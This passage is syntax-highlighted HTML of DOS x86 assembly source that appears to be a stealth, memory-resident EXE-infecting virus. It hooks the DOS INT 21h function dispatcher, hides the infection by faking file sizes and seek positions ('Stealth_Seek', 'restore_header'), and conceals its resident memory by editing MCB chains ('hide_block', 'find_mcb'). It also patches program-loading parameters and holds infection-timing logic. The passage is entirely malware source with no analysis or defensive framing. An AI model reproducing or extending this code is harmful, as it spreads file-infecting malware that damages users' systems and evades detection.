    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc5">IfInfJump</span><span class="sc0"> </span><span class="sc5">Handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">save_seek</span><span class="sc0"> </span><span class="sc1">;if (cx &gt; f_real_size-pos) cx := f_real_size-pos</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">saved_seek.lo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">saved_seek.hi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
        </span><span class="sc5">MIN</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">st_cx</span><span class="sc4">]&gt;,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;_CX</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">aft_3F</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;ret</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">st_rd_off</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc1">;si:di - buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">beg_pos_lo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">MIN</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;ax - delta pos</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rd_st_cnt</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc5">IfInfJump</span><span class="sc0"> </span><span class="sc5">Handle</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0"> </span><span class="sc1">;dx:ax - original size,</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_size.1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;add 100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_header</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_size.1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;sub 100h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc1">;    DOIF    NC</span><span class="sc0">
</span><span class="sc1">;        mov     es, si ;es:di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rd_st_cnt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">st_rd_off</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._exehdr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">beg_pos_lo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc1">;    DONE</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">bfr_42</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;seek_end</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_end</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Stealth_Seek</span><span class="sc0"> </span><span class="sc1">;seek to fake end</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">st_ax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;    mov        ax, 4201h</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">Stealth_Seek</span><span class="sc0">  </span><span class="sc1">;dx:ax =&gt; cx:dx</span><span class="sc0">
    </span><span class="sc5">ifInfJump</span><span class="sc0">   </span><span class="sc5">Handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dosseek</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;comment #</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">bfr_4B</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;show block</span><span class="sc0">
</span><span class="sc1">;    cmp     al, 0DBh</span><span class="sc0">
</span><span class="sc1">;    je      goto_EXE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">load_fname</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">load_array</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">show_block</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;if 4b01(3) need after</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">noff</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">retu</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opJMPS</span><span class="sc0"> </span><span class="sc1">;continue21-retu-1</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">selector21</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;hach</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc5">arena_owner</span><span class="sc4">],</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">;cs</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">functions</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">funcnt</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">noff</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bfr_aft</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">after_goto</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;bfr</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">after_dos_goto</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;aft</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">bfr_4A</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">bfr_48</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;    cmp     al, 36h ;for 'Lingvo' compatible</span><span class="sc0">
</span><span class="sc1">;    mov     al, 0</span><span class="sc0">
</span><span class="sc1">;    DOIF NE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_cf</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;al</span><span class="sc0">
</span><span class="sc1">;    DONE</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">bfr_67</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">show_block</span><span class="sc0">
</span><span class="sc1">;ret</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_mcb</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">   </span><span class="sc1">;si=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.arena_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">si.arena_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.arena_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.arena_signature</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.arena_signature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">si.arena_signature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">aft_4B</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">load_fname</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">loadprog</span><span class="sc0">
</span><span class="sc1">;-+--hide_block------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">aft_48</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_67</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_4A</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;ret</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">hide_block</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_mcb</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">si.arena_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.arena_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">si.arena_signature</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.arena_signature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;CRPROC find_mcb, 227Dh ;return ds</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">find_mcb</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">52h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0"> </span><span class="sc1">;es:[bx][2] - root mcb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">][-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">si.arena_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">loadprog</span><span class="sc0">
    </span><span class="sc5">ifInfJump</span><span class="sc0"> </span><span class="sc9">Name</span><span class="sc0">

</span><span class="sc1">;    mov     si, word ptr [exehdr.exe_CS]</span><span class="sc0">
</span><span class="sc1">;    mov     di, word ptr [exehdr.exe_SS]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_CS</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_SS</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_header</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosclose</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">load_array</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_CS</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_SS</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">Exec1_CS</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">Exec1_SS</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_IP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_SP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">Exec1_IP</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">Exec1_SP</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">@ret</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;loadprog endp</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">


</span><span class="sc5">bfr_4C</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">bfr_00</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">@Cpu</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;x86</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">noff</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">          </span><span class="sc1">;8086</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">noff</span><span class="sc0"> </span><span class="sc1">;call aft_49</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;jmp noff ;ret</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">bfr_31</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_31</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_49</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;ret</span><span class="sc0">
</span><span class="sc1">;time_test</span><span class="sc0">
</span><span class="sc1">;    call    get_cur_time</span><span class="sc0">
</span><span class="sc1">;    sub     ax, [last_infect_time]</span><span class="sc0">
</span><span class="sc1">;    cmp     ax, INTERVAL_INFECT ;0.5 ¬¨­</span><span class="sc0">
</span><span class="sc1">;    jl      @ret</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">no_freq_proc</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">arena_owner</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1600h</span><span class="sc0">   </span><span class="sc1">;test for MS win</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1600h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@ret</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5802h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5803h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5800h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
